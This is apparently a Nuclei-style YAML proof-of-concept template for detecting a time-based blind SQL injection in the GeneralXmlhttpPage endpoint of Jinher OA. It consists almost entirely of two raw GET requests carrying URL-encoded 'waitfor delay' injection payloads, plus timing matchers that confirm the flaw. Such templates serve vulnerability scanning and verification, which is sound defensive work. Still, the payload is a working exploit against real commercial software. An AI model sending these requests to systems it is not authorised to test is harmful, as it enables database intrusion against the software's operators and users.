id: poc-yaml-jinher-generalxmlhttppage-sqli
info:
  name: "金和 OA GeneralXmlhttpPage 接口 SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: 金和网络
  reference:
    - app="金和网络-金和OA"
  metadata:
    finger: 金和OA

http:
  - raw:
      - |
        GET /C6/Jhsoft.Web.appraise/AppraiseScoreUpdate.aspx/GeneralXmlhttpPage.aspx/?id=%27and%28select%2B1%29%3E0waitfor%2F%2A%2A%2Fdelay%270%3A0%3A5 HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /C6/Jhsoft.Web.appraise/AppraiseScoreUpdate.aspx/GeneralXmlhttpPage.aspx/?id=%27and%28select%2B1%29%3E0waitfor%2F%2A%2A%2Fdelay%270%3A0%3A8 HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "/JHSoft.UI.Lib/"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and

